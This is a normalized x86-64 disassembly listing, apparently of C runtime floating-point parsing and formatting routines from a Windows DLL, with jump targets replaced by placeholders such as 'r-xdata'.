mov rax [ r12 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
mov ecx 0x3
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
sub r9d eax
je r-xdata
mov r9d 0x1
jmp r-xdata
mov dl [ r8 ]
add r8 r9
sub dl 0x31
cmp dl 0x8
ja r-xdata
cmp dl r11b
jge r-xdata
cmp ecx 0xa
je r-xdata
cmp [ rsp + 0x120 ] ebx
je r-xdata
cmp edi ebx
jbe r-xdata
mov al [ rsp + 0x97 ]
cmp al 0x5
jl r-xdata
mov ecx 0x2
mov [ rsp + 0x3c ] bx
jmp r-xdata
cmp dl 0x2d
je r-xdata
mov ecx 0x4
jmp r-xdata
cmp dl 0x2b
je r-xdata
mov rax [ r12 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
mov r9 rax
mov al 0x30
mov r13d r9d
jmp r-xdata
cmp r9d eax
jne r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov r9 rax
jmp r-xdata
lea r11 [ r8 - 0x1 ]
cmp dl 0x2b
je r-xdata
mov dx bx
mov ax bx
mov edi ebx
mov ecx ebx
jmp r-xdata
sub r10 r9
or r15d 0xffffffff
jmp r-xdata
sub r10 r9
mov edi 0x18
add esi r9d
add al r9b
mov [ rsp + 0x97 ] al
mov ecx 0x2
mov [ rsp + 0x3c ] 0x8000
jmp r-xdata
cmp dl 0x30
je r-xdata
sub r8 r9
mov ecx 0xb
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp dl 0x30
jne r-xdata
cmp dl al
jge r-xdata
mov r9 rax
mov r13d r9d
mov [ rsp + 0x30 ] r9d
cmp edi ebx
jne r-xdata
cmp dl r11b
jge r-xdata
lea ecx [ rbp + rbp * 4 ]
movsx eax dl
lea ebp [ rax + rcx * 2 - 0x30 ]
cmp ebp 0x1450
jg r-xdata
mov ecx 0x7
mov r9 rax
jmp r-xdata
cmp dl 0x2d
jne r-xdata
mov r8 [ rsp + 0x48 ]
or ax [ rsp + 0x3c ]
mov [ r8 + 0xa ] ax
mov eax ebx
mov [ r8 ] dx
mov [ r8 + 0x2 ] ecx
mov [ r8 + 0x6 ] edi
cmp [ r10 ] bl
je r-xdata
mov r9d 0x1
mov r9d 0x1
cmp dl 0x30
je r-xdata
cmp dl 0x39
jg r-xdata
mov rax [ r12 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
jne r-xdata
cmp dl 0x30
jge r-xdata
jmp r-xdata
cmp dl 0x39
jg r-xdata
jmp r-xdata
mov ebp 0x1451
jmp r-xdata
mov dl [ r8 ]
add r8 r9
mov r8 r11
mov r9 rax
jmp r-xdata
or [ rsp + 0x34 ] 0xffffffff
add edi r15d
add esi r9d
sub r10 r9
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x80 ]
mov edx edi
call sub_180023090
cmp [ rsp + 0x34 ] ebx
jge r-xdata
mov ecx r9d
jmp r-xdata
jmp r-xdata
cmp edi 0x19
jae r-xdata
cmp dl 0x2b
je r-xdata
cmp dl 0x39
jg r-xdata
cmp dl 0x30
je r-xdata
mov dl [ r8 ]
add r8 r9
add ebp esi
cmp r14d ebx
jne r-xdata
neg ebp
cmp dl 0x43
jle r-xdata
add esi r9d
sub dl al
add edi r9d
mov [ r10 ] dl
add r10 r9
jmp r-xdata
cmp dl 0x2d
je r-xdata
cmp edi 0x19
jae r-xdata
mov dl [ r8 ]
sub esi r9d
add r8 r9
jmp r-xdata
cmp [ rsp + 0x30 ] ebx
jne r-xdata
add ebp [ rsp + 0x110 ]
cmp dl 0x45
jle r-xdata
mov dl [ r8 ]
add r8 r9
mov dl [ r8 ]
add r8 r9
sub dl 0x30
add edi r9d
mov [ r10 ] dl
add r10 r9
sub esi r9d
cmp ebp 0x1450
jg r-xdata
sub ebp [ rsp + 0x118 ]
mov ecx 0x6
jmp r-xdata
cmp dl 0x63
jle r-xdata
mov ecx ebx
mov dx bx
mov eax 0x7fff
mov ebx 0x2
mov edi 0x80000000
jmp r-xdata
cmp ebp 0xffffebb0
jl r-xdata
cmp dl 0x65
jg r-xdata
mov edx ebx
mov ax bx
mov edi ebx
mov ecx ebx
mov ebx 0x1
jmp r-xdata
lea rsi [ rw-data ]
sub rsi 0x60
cmp ebp ebx
je r-xdata
mov eax [ rsp + 0x68 ]
mov dx [ rsp + 0x60 ]
mov ecx [ rsp + 0x62 ]
mov edi [ rsp + 0x66 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ rsp + 0x38 ] ebx
jne r-xdata
lea rsi [ rw-data ]
neg ebp
sub rsi 0x60
cmp ebp ebx
je r-xdata
mov [ rsp + 0x60 ] bx
mov edi 0x80000000
mov r9d 0x7fff
mov r11d 0x1
cmp ebp ebx
jne r-xdata
cdqe
mov r14d 0x8000
lea rcx [ rax + rax * 2 ]
lea rdx [ rsi + rcx * 4 ]
cmp [ rdx ] r14w
jb r-xdata
mov eax ebp
add rsi 0x54
sar ebp 0x3
and eax 0x7
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x38 ] ebp
cmp eax ebx
je r-xdata
movzx ecx [ rdx + 0xa ]
mov eax ebx
movzx eax [ rsp + 0x6a ]
movzx r13d cx
and cx r9w
mov [ rsp + 0x50 ] ebx
xor r13w ax
and ax r9w
mov [ rsp + 0x54 ] ebx
and r13w r14w
lea r8d [ rax + rcx ]
mov [ rsp + 0x58 ] ebx
cmp ax r9w
jae r-xdata
mov rax [ rdx ]
lea rcx [ rsp + 0x70 ]
mov [ rcx ] rax
mov eax [ rdx + 0x8 ]
lea rdx [ rsp + 0x70 ]
mov [ rcx + 0x8 ] eax
mov rax [ rsp + 0x70 ]
shr rax 0x10
sub eax r11d
mov [ rsp + 0x72 ] eax
neg r13w
sbb eax eax
and eax edi
add eax 0x7fff8000
mov [ rsp + 0x68 ] eax
cmp cx r9w
jae r-xdata
mov r10d 0xbffd
cmp r8w r10w
ja r-xdata
mov r10d 0x3fbf
cmp r8w r10w
ja r-xdata
cmp ax bx
jne r-xdata
mov [ rsp + 0x68 ] ebx
jmp r-xdata
cmp cx bx
jne r-xdata
mov eax [ rsp + 0x68 ]
add r8w r11w
btr eax 0x1f
cmp eax ebx
jne r-xdata
mov [ rsp + 0x60 ] ebx
mov [ rsp + 0x64 ] ebx
mov esi 0x1
mov r12d ebx
lea rcx [ rsp + 0x54 ]
lea r10d [ rsi + 0x4 ]
mov eax [ rdx + 0x8 ]
add r8w r11w
btr eax 0x1f
cmp eax ebx
jne r-xdata
cmp [ rsp + 0x64 ] ebx
jne r-xdata
sub r10d esi
add rcx 0x2
add r12d esi
cmp r10d ebx
jg r-xdata
mov edi r12d
lea r14 [ rsp + r9 + 0x60 ]
lea r15 [ rdx + 0x8 ]
and edi esi
cmp [ rdx + 0x4 ] ebx
jne r-xdata
cmp [ rsp + 0x60 ] ebx
jne r-xdata
cmp r10d ebx
lea eax [ r12 + r12 ]
mov [ rsp + 0x34 ] r10d
movsxd r9 eax
jle r-xdata
mov r10d [ rsp + 0x58 ]
mov r9d [ rsp + 0x50 ]
mov eax 0xc002
add r8w ax
mov r12d 0xffff
cmp r8w bx
jle r-xdata
mov r11d esi
cmp ebp r9d
jae r-xdata
cmp [ rdx ] ebx
je r-xdata
mov [ rsp + 0x6a ] bx
jmp r-xdata
add r8w r12w
jns r-xdata
bt r10d 0x1f
jb r-xdata
mov r11d [ rsp + 0x34 ]
add r14 0x2
sub r15 0x2
sub r11d esi
cmp r11d ebx
mov [ rsp + 0x34 ] r11d
jg r-xdata
add [ rcx ] si
mov [ rcx - 0x4 ] ebp
cmp r11d ebx
je r-xdata
mov ax [ rsp + 0x50 ]
movzx eax r8w
neg ax
movzx edx ax
add r8w dx
cmp r8w bx
jg r-xdata
mov r11d [ rsp + 0x54 ]
mov edx r9d
add r10d r10d
shr edx 0x1f
add r9d r9d
mov ecx r11d
shr ecx 0x1f
lea eax [ r11 + r11 ]
add r8w r12w
or eax edx
or r10d ecx
cmp r8w bx
mov [ rsp + 0x54 ] eax
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x50 ] r9d
jg r-xdata
movzx eax [ r14 ]
movzx r9d [ r15 ]
mov r11d ebx
imul r9d eax
mov eax [ rcx - 0x4 ]
lea ebp [ rax + r9 ]
cmp ebp eax
jb r-xdata
mov eax [ rsp + 0x52 ]
or r15d 0xffffffff
mov r11d 0x1
cmp eax r15d
jne r-xdata
and r9d 0x1ffff
cmp r9d 0x18000
jne r-xdata
mov r11d [ rsp + 0x54 ]
mov eax r10d
shr r9d 0x1
mov ecx r11d
shl eax 0x1f
shr r11d 0x1
shl ecx 0x1f
or r11d eax
shr r10d 0x1
or r9d ecx
sub rdx rsi
mov [ rsp + 0x54 ] r11d
mov [ rsp + 0x50 ] r9d
jne r-xdata
add ebx esi
add eax r11d
mov [ rsp + 0x52 ] eax
jmp r-xdata
mov eax [ rsp + 0x56 ]
mov [ rsp + 0x52 ] ebx
cmp eax r15d
jne r-xdata
mov r11d 0x1
test [ rsp + 0x50 ] sil
je r-xdata
mov [ rsp + 0x30 ] ebx
xor ebx ebx
mov [ rsp + 0x58 ] r10d
mov eax [ rsp + 0x30 ]
cmp eax ebx
je r-xdata
mov ebp [ rsp + 0x38 ]
mov r9d 0x7fff
cmp r8w r9w
jae r-xdata
add eax r11d
mov [ rsp + 0x56 ] eax
movzx eax [ rsp + 0x5a ]
mov [ rsp + 0x56 ] ebx
cmp ax r12w
jne r-xdata
movzx eax [ rsp + 0x52 ]
or r8w r13w
mov [ rsp + 0x66 ] r10d
mov [ rsp + 0x60 ] ax
mov eax [ rsp + 0x54 ]
mov [ rsp + 0x6a ] r8w
mov [ rsp + 0x62 ] eax
jmp r-xdata
movzx eax r9w
or ax si
mov [ rsp + 0x50 ] ax
mov r9d [ rsp + 0x50 ]
jmp r-xdata
add ax r11w
mov [ rsp + 0x5a ] ax
jmp r-xdata
mov [ rsp + 0x5a ] r14w
add r8w r11w
jmp r-xdata
mov rsi [ rsp + 0x40 ]
mov r14d 0x8000
mov edi 0x80000000
cmp ax r14w
ja r-xdata
mov r10d [ rsp + 0x58 ]
jmp r-xdata
sub_180022528
mov r11 rsp
mov [ r11 + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movzx edi [ rcx + 0x8 ]
mov r10d [ rcx ]
mov r14d 0x8000
mov rbx r9
mov r9d [ rcx + 0x4 ]
movzx ecx di
and cx r14w
mov [ r11 - 0x68 ] 0xcc
mov [ r11 - 0x67 ] 0xcc
mov [ r11 - 0x66 ] 0xcc
mov [ r11 - 0x65 ] 0xcc
mov [ r11 - 0x64 ] 0xcc
mov [ r11 - 0x63 ] 0xcc
mov [ r11 - 0x62 ] 0xcc
mov [ r11 - 0x61 ] 0xcc
mov [ r11 - 0x60 ] 0xcc
mov [ r11 - 0x5f ] 0xcc
mov [ r11 - 0x5e ] 0xfb
mov [ r11 - 0x5d ] 0x3f
mov r11d 0x1
lea ebp [ r14 - 0x1 ]
lea eax [ r11 + 0x1f ]
xor r12d r12d
and di bp
mov [ rsp + 0x44 ] edx
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x4c ] r8d
mov [ rsp + 0x30 ] cx
lea edx [ rax + 0xd ]
cmp cx r12w
je r-xdata
mov [ rbx + 0x2 ] al
mov [ rbx + 0x2 ] dl
jmp r-xdata
cmp di bp
jne r-xdata
cmp r9d r12d
jne r-xdata
cmp di r12w
jne r-xdata
movzx r8d di
mov ecx r9d
mov [ rsp + 0x76 ] r9d
shr ecx 0x18
mov eax r8d
mov [ rsp + 0x72 ] r10d
shr eax 0x8
lea r9 [ rw-data ]
mov r13d 0x5
imul r8d r8d 0x4d10
lea edx [ rax + rcx * 2 ]
sub r9 0x60
mov [ rsp + 0x7a ] di
mov [ rsp + 0x70 ] r12w
mov [ rsp + 0x48 ] r13d
mov esi 0xbffd
imul edx edx 0x4d
lea ecx [ rdx + r8 - 0x134312f4 ]
mov edi 0x3fbf
sar ecx 0x10
movsx r10d cx
mov [ rsp + 0x34 ] ecx
neg r10d
cmp r10d r12d
je r-xdata
mov eax 0x80000000
mov [ rbx ] r11w
cmp r9d eax
jne r-xdata
cmp r10d r12d
jne r-xdata
mov r8d [ rsp + 0x74 ]
mov edx [ rsp + 0x70 ]
jge r-xdata
bt r9d 0x1e
jb r-xdata
cmp r10d r12d
je r-xdata
cmp cx r14w
cmove eax edx
mov r13d 0x8000
add cx r11w
mov r9d 0x8000
mov r15d r12d
mov [ rsp + 0x34 ] ecx
movzx ecx [ rsp + 0x8a ]
mov [ rsp + 0x60 ] r12d
movzx r14d cx
and cx bp
mov [ rsp + 0x64 ] r12d
xor r14w ax
and ax bp
mov [ rsp + 0x68 ] r12d
and r14w r9w
lea r9d [ rax + rcx ]
cmp ax bp
jae r-xdata
cmp r10d r12d
je r-xdata
lea r9 [ rw-data ]
neg r10d
sub r9 0x60
cmp cx r12w
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov eax r11d
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0xf8 ]
add rsp 0xb0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r10d [ rsp + 0x78 ]
mov eax 0x15
mov [ rsp + 0x7a ] r12w
mov r9d [ rsp + 0x78 ]
cmp esi eax
lea edi [ rax - 0xd ]
cmovg esi eax
shr r10d 0x10
sub r10d 0x3ffe
cwde
add esi eax
cmp esi r12d
jg r-xdata
neg r14w
sbb eax eax
and eax 0x80000000
add eax 0x7fff8000
mov [ rsp + 0x78 ] eax
cmp cx bp
jae r-xdata
mov r8d [ rsp + 0x74 ]
mov edx [ rsp + 0x70 ]
cmp r9d eax
jne r-xdata
cmp r9d 0xc0000000
jne r-xdata
lea rcx [ rbx + 0x4 ]
mov edx 0x16
call sub_18001695c
cmp eax r12d
je r-xdata
mov ecx r8d
mov eax edx
add r9d r9d
add r8d r8d
shr eax 0x1f
shr ecx 0x1f
or r8d eax
or r9d ecx
add edx edx
sub rdi r11
jne r-xdata
cmp r10d r12d
mov [ rsp + 0x74 ] r8d
mov [ rsp + 0x70 ] edx
mov [ rsp + 0x78 ] r9d
jge r-xdata
cmp [ rsp + 0x30 ] r13w
mov eax 0x20
lea ecx [ rax + 0xd ]
cmove eax ecx
jmp r-xdata
cmp r9w si
ja r-xdata
cmp r10d r12d
jne r-xdata
cdqe
lea rcx [ rax + rax * 2 ]
lea rbp [ r9 + rcx * 4 ]
mov [ rsp + 0x58 ] rbp
cmp [ rbp ] r14w
jb r-xdata
lea r8 [ r--data ]
cmp r10d r12d
jne r-xdata
cmp r10d r12d
jne r-xdata
mov [ rbx + 0x3 ] 0x6
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_18001063c
lea ebp [ rsi + 0x1 ]
lea rdi [ rbx + 0x4 ]
cmp ebp r12d
mov r10 rdi
jle r-xdata
neg r10d
movzx r10d r10b
cmp r10d r12d
jle r-xdata
mov [ rbx + 0x4 ] 0x30
cmp r9w di
ja r-xdata
mov eax r10d
add r9 0x54
sar r10d 0x3
and eax 0x7
mov [ rsp + 0x38 ] r9
mov [ rsp + 0x40 ] r10d
cmp eax r12d
je r-xdata
mov rbx [ rsp + 0x50 ]
mov ecx [ rsp + 0x34 ]
jmp r-xdata
movzx ecx [ rbp + 0xa ]
movzx eax [ rsp + 0x7a ]
mov r15d 0x7fff
movzx edi cx
and cx r15w
mov ebx r12d
xor di ax
and ax r15w
mov [ rsp + 0x60 ] r12d
and di r14w
mov [ rsp + 0x64 ] r12d
mov [ rsp + 0x68 ] r12d
lea r9d [ rax + rcx ]
mov [ rsp + 0x32 ] di
cmp ax r15w
jae r-xdata
mov rax [ rbp ]
lea rcx [ rsp + 0x90 ]
mov [ rcx ] rax
mov eax [ rbp + 0x8 ]
lea rbp [ rsp + 0x90 ]
mov [ rcx + 0x8 ] eax
mov rax [ rsp + 0x90 ]
mov [ rsp + 0x58 ] rbp
shr rax 0x10
sub eax r11d
mov [ rsp + 0x92 ] eax
lea r8 [ r--data ]
lea r8 [ r--data ]
jmp r-xdata
sub r10 r11
mov al [ r10 ]
sub r10 r11
cmp al 0x35
jl r-xdata
add r9d r9d
lea rcx [ rsp + 0x70 ]
lea rsi [ rsp + 0x90 ]
mov rax [ rcx ]
mov [ rsi ] rax
mov eax [ rcx + 0x8 ]
mov ecx r8d
mov [ rsi + 0x8 ] eax
mov eax edx
add r8d r8d
shr eax 0x1f
shr ecx 0x1f
add edx edx
or r8d eax
or r9d ecx
mov eax edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
or r8d eax
mov rax [ rsp + 0x90 ]
add edx edx
shr ecx 0x1f
add r9d r9d
lea r12d [ rax + rdx ]
or r9d ecx
cmp r12d edx
jb r-xdata
mov ecx r8d
mov eax r9d
shr edx 0x1
shr r8d 0x1
shl eax 0x1f
shl ecx 0x1f
sub r10d r11d
shr r9d 0x1
or r8d eax
or edx ecx
cmp r10d r12d
jg r-xdata
cmp ax r12w
jne r-xdata
mov [ rsp + 0x78 ] r12d
jmp r-xdata
mov eax [ rsp + 0x78 ]
mov r9d 0x3fff
shr eax 0x10
cmp ax r9w
jb r-xdata
neg di
mov edi 0x3fbf
sbb eax eax
and eax 0x80000000
add eax 0x7fff8000
mov [ rsp + 0x78 ] eax
cmp cx r15w
jae r-xdata
mov eax 0x5
mov [ rbx + 0x3 ] al
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_18001063c
lea rcx [ rbx + 0x4 ]
mov edx 0x16
call sub_18001695c
cmp eax r12d
je r-xdata
cmp r10 rdi
jae r-xdata
jmp r-xdata
lea ecx [ r8 + 0x1 ]
xor edx edx
cmp ecx r8d
jb r-xdata
cmp r12d eax
jae r-xdata
mov [ rsp + 0x74 ] r8d
mov [ rsp + 0x70 ] edx
mov [ rsp + 0x78 ] r9d
cmp cx r12w
jne r-xdata
mov eax [ rsp + 0x78 ]
add r9w r11w
btr eax 0x1f
cmp eax r12d
jne r-xdata
mov edx r12d
mov r8d r12d
cmp r9w si
ja r-xdata
mov r11d r12d
jmp r-xdata
cmp [ r10 ] 0x30
jne r-xdata
cmp r10 rdi
jae r-xdata
cmp r10 rdi
jae r-xdata
mov edx r11d
cmp ecx r11d
jae r-xdata
shr rax 0x20
lea esi [ r8 + rax ]
cmp esi r8d
jb r-xdata
mov edi r12d
lea rdx [ rsp + 0x64 ]
mov eax [ rsp + 0x88 ]
add r9w r11w
btr eax 0x1f
cmp eax r12d
jne r-xdata
cmp r8d r12d
jne r-xdata
mov edi 0x3fbf
cmp r9w di
ja r-xdata
sub r10 r11
sub r10b bl
sub r10b 0x3
movsx rax r10b
mov [ rbx + 0x3 ] r10b
mov [ rax + rbx + 0x4 ] r12b
cmp [ rsp + 0x30 ] r13w
mov eax 0x20
mov [ rdi ] 0x30
lea ecx [ rax + 0xd ]
cmove eax ecx
jmp r-xdata
cmp [ r10 ] 0x39
jne r-xdata
cmp r10 rdi
jae r-xdata
add r9d r11d
mov r8d ecx
test edx edx
je r-xdata
add r9d r11d
cmp esi eax
jae r-xdata
sub r13d r11d
xor r12d r12d
add rdx 0x2
add edi r11d
cmp r13d r12d
mov [ rsp + 0x48 ] r13d
jg r-xdata
mov r13d edi
lea rsi [ rsp + 0x88 ]
lea rbp [ rsp + rcx + 0x70 ]
and r13d r11d
cmp [ rsp + 0x84 ] r12d
jne r-xdata
cmp edx r12d
jne r-xdata
cmp ax r12w
jne r-xdata
mov [ rsp + 0x78 ] r12d
jmp r-xdata
mov [ rbx ] r12w
mov [ rbx + 0x3 ] r11b
mov [ rbx + 0x2 ] al
mov [ rbx + 0x5 ] r12b
jmp r-xdata
mov [ r10 ] 0x30
sub r10 r11
add [ r10 ] r11b
add r10 r11
add [ rbx ] r11w
mov r9d [ rsp + 0x78 ]
jmp r-xdata
add r9d [ rsp + 0x98 ]
mov eax r12d
lea edx [ r12 + r12 ]
shr eax 0x1f
xor r12d r12d
lea r8d [ rsi + rsi ]
or r8d eax
mov ecx esi
lea eax [ r9 + r9 ]
shr ecx 0x1f
sub ebp r11d
mov [ rsp + 0x70 ] edx
or eax ecx
mov [ rsp + 0x74 ] r8d
mov [ rsp + 0x78 ] eax
shr eax 0x18
mov [ rsp + 0x7b ] r12b
add al 0x30
mov [ r10 ] al
add r10 r11
cmp ebp r12d
jle r-xdata
lea eax [ rdi + rdi ]
xor ebx ebx
mov r12d r13d
cmp r13d ebx
movsxd rcx eax
jle r-xdata
mov r8d [ rsp + 0x68 ]
mov r10d [ rsp + 0x60 ]
mov eax 0xc002
add r9w ax
mov esi 0xffff
cmp r9w r12w
jle r-xdata
mov r10d r11d
cmp r8d ecx
jae r-xdata
cmp [ rsp + 0x80 ] r12d
je r-xdata
mov [ rsp + 0x7a ] r12w
jmp r-xdata
cmp cx r12w
jne r-xdata
mov eax [ rsp + 0x78 ]
add r9w r11w
btr eax 0x1f
cmp eax r12d
jne r-xdata
mov edx r12d
mov r8d r12d
mov [ rsp + 0x74 ] r12d
mov [ rsp + 0x70 ] edx
add r9w si
jns r-xdata
bt r8d 0x1f
jb r-xdata
sub r12d r11d
add rbp 0x2
sub rsi 0x2
cmp r12d ebx
jg r-xdata
add [ rdx ] r11w
mov [ rdx - 0x4 ] r8d
cmp r10d ebx
je r-xdata
mov esi r12d
lea r8 [ rsp + 0x64 ]
mov edi r13d
mov eax [ rbp + 0x8 ]
add r9w r11w
btr eax 0x1f
cmp eax r12d
jne r-xdata
cmp r8d r12d
jne r-xdata
mov ax [ rsp + 0x60 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
cmp r9w r12w
jg r-xdata
mov edi [ rsp + 0x64 ]
mov edx r10d
add r8d r8d
shr edx 0x1f
add r10d r10d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w si
or eax edx
or r8d ecx
cmp r9w r12w
mov [ rsp + 0x64 ] eax
mov [ rsp + 0x68 ] r8d
mov [ rsp + 0x60 ] r10d
jg r-xdata
movzx eax [ rbp ]
movzx ecx [ rsi ]
mov r10d ebx
imul ecx eax
mov eax [ rdx - 0x4 ]
lea r8d [ rax + rcx ]
cmp r8d eax
jb r-xdata
mov r13d [ rsp + 0x48 ]
sub edi r11d
add r8 0x2
add esi r11d
cmp edi r12d
jg r-xdata
mov r15d esi
lea r13 [ rbp + 0x8 ]
lea r12 [ rsp + rcx + 0x70 ]
and r15d r11d
xor ebp ebp
cmp [ rbp + 0x4 ] r12d
jne r-xdata
cmp edx r12d
jne r-xdata
mov eax [ rsp + 0x62 ]
or ecx 0xffffffff
cmp eax ecx
jne r-xdata
and r10d 0x1ffff
cmp r10d 0x18000
jne r-xdata
mov edi [ rsp + 0x64 ]
mov eax r8d
shr r10d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r8d 0x1
or r10d ecx
sub rdx r11
mov [ rsp + 0x64 ] edi
mov [ rsp + 0x60 ] r10d
jne r-xdata
add r15d r11d
cmp edi r12d
lea eax [ rsi + rsi ]
mov r14d edi
movsxd rcx eax
jle r-xdata
mov r10d [ rsp + 0x68 ]
mov r8d [ rsp + 0x60 ]
mov eax 0xc002
add r9w ax
mov r15d 0xffff
cmp r9w r12w
jle r-xdata
mov r10d r11d
cmp edx ecx
jae r-xdata
cmp [ rbp ] r12d
je r-xdata
mov [ rsp + 0x7a ] r12w
jmp r-xdata
add eax r11d
mov [ rsp + 0x62 ] eax
mov eax [ rsp + 0x66 ]
mov [ rsp + 0x62 ] r12d
cmp eax ecx
jne r-xdata
mov r15d 0x7fff
cmp r9w r15w
jb r-xdata
test [ rsp + 0x60 ] r11b
je r-xdata
mov [ rsp + 0x68 ] r8d
cmp r15d r12d
je r-xdata
add r9w r15w
jns r-xdata
bt r10d 0x1f
jb r-xdata
sub r14d r11d
add r12 0x2
sub r13 0x2
cmp r14d ebp
jg r-xdata
add [ r8 ] r11w
mov [ r8 - 0x4 ] edx
cmp r10d ebp
je r-xdata
mov ebp r15d
movzx eax [ rsp + 0x62 ]
or r9w r14w
mov [ rsp + 0x76 ] r8d
mov [ rsp + 0x70 ] ax
mov eax [ rsp + 0x64 ]
mov [ rsp + 0x7a ] r9w
mov [ rsp + 0x72 ] eax
mov r8d [ rsp + 0x74 ]
mov edx [ rsp + 0x70 ]
jmp r-xdata
neg r14w
mov r8d r12d
mov edx r12d
sbb eax eax
and eax 0x80000000
add eax 0x7fff8000
mov [ rsp + 0x78 ] eax
jmp r-xdata
add eax r11d
mov [ rsp + 0x66 ] eax
movzx eax [ rsp + 0x6a ]
mov [ rsp + 0x66 ] r12d
cmp ax si
jne r-xdata
movzx eax r10w
or ax r11w
mov [ rsp + 0x60 ] ax
mov r10d [ rsp + 0x60 ]
jmp r-xdata
mov ax [ rsp + 0x60 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
cmp r9w r12w
jg r-xdata
mov edi [ rsp + 0x64 ]
mov edx r8d
add r10d r10d
shr edx 0x1f
add r8d r8d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w r15w
or eax edx
or r10d ecx
cmp r9w r12w
mov [ rsp + 0x64 ] eax
mov [ rsp + 0x68 ] r10d
mov [ rsp + 0x60 ] r8d
jg r-xdata
movzx eax [ r13 ]
movzx ecx [ r12 ]
mov r10d ebp
imul ecx eax
mov eax [ r8 - 0x4 ]
lea edx [ rax + rcx ]
cmp edx eax
jb r-xdata
mov rbp [ rsp + 0x58 ]
xor r12d r12d
mov eax [ rsp + 0x34 ]
mov esi [ rsp + 0x44 ]
mov [ rbx ] ax
test [ rsp + 0x4c ] r11b
je r-xdata
add ax r11w
mov [ rsp + 0x6a ] ax
jmp r-xdata
mov [ rsp + 0x6a ] r13w
add r9w r11w
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov r13d 0x8000
cmp ax r13w
ja r-xdata
mov eax [ rsp + 0x62 ]
or ecx 0xffffffff
cmp eax ecx
jne r-xdata
and r8d 0x1ffff
cmp r8d 0x18000
jne r-xdata
mov edi [ rsp + 0x64 ]
mov eax r10d
shr r8d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r10d 0x1
or r8d ecx
sub rdx r11
mov [ rsp + 0x64 ] edi
mov [ rsp + 0x60 ] r8d
jne r-xdata
add ebx r11d
mov r8d [ rsp + 0x68 ]
jmp r-xdata
add eax r11d
mov [ rsp + 0x62 ] eax
mov eax [ rsp + 0x66 ]
mov [ rsp + 0x62 ] r12d
cmp eax ecx
jne r-xdata
mov ebp 0x7fff
mov r13d 0x5
mov esi 0xbffd
mov edi 0x3fbf
cmp r9w bp
jb r-xdata
test [ rsp + 0x60 ] r11b
je r-xdata
mov [ rsp + 0x68 ] r10d
cmp ebx r12d
je r-xdata
movzx eax [ rsp + 0x62 ]
mov [ rsp + 0x76 ] r10d
mov [ rsp + 0x70 ] ax
mov eax [ rsp + 0x64 ]
mov [ rsp + 0x72 ] eax
mov ax [ rsp + 0x32 ]
mov r8d [ rsp + 0x74 ]
mov edx [ rsp + 0x70 ]
or r9w ax
mov [ rsp + 0x7a ] r9w
jmp r-xdata
mov ax [ rsp + 0x32 ]
mov edx r12d
mov r8d r12d
neg ax
mov [ rsp + 0x74 ] r12d
mov [ rsp + 0x70 ] edx
sbb eax eax
and eax 0x80000000
add eax 0x7fff8000
mov [ rsp + 0x78 ] eax
add eax r11d
mov [ rsp + 0x66 ] eax
movzx eax [ rsp + 0x6a ]
mov [ rsp + 0x66 ] r12d
cmp ax r15w
jne r-xdata
movzx eax r8w
or ax r11w
mov [ rsp + 0x60 ] ax
mov r8d [ rsp + 0x60 ]
jmp r-xdata
mov r10d [ rsp + 0x40 ]
jmp r-xdata
mov r9 [ rsp + 0x38 ]
add ax r11w
mov [ rsp + 0x6a ] ax
jmp r-xdata
mov [ rsp + 0x6a ] r14w
add r9w r11w
jmp r-xdata
mov r14d 0x8000
cmp ax r14w
ja r-xdata
mov r10d [ rsp + 0x68 ]
jmp r-xdata
sub_180023090
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r13
sub rsp 0x20
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x10 ] rax
and [ r8 ] 0x0
and [ r8 + 0x4 ] 0x0
and [ r8 + 0x8 ] 0x0
mov rbx r8
mov esi edx
mov rbp rcx
mov edi 0x404e
test edx edx
je r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov r13d 0x1
bt [ rbx + 0x8 ] 0xf
jb r-xdata
mov ecx [ rbx ]
mov edx [ rbx + 0x4 ]
mov r8d edx
mov eax ecx
shl edx 0x10
shr eax 0x10
shr r8d 0x10
shl ecx 0x10
or edx eax
mov eax 0xfff0
mov [ rbx + 0x8 ] r8d
add di ax
mov [ rbx + 0x4 ] edx
mov [ rbx ] ecx
test r8d r8d
je r-xdata
mov eax r13d
cmp r8d ecx
jae r-xdata
mov [ rbx + 0xa ] di
mov rcx [ rsp + 0x10 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
add rsp 0x20
pop r13
pop rdi
pop rsi
retn
mov ecx [ rbx + 0x4 ]
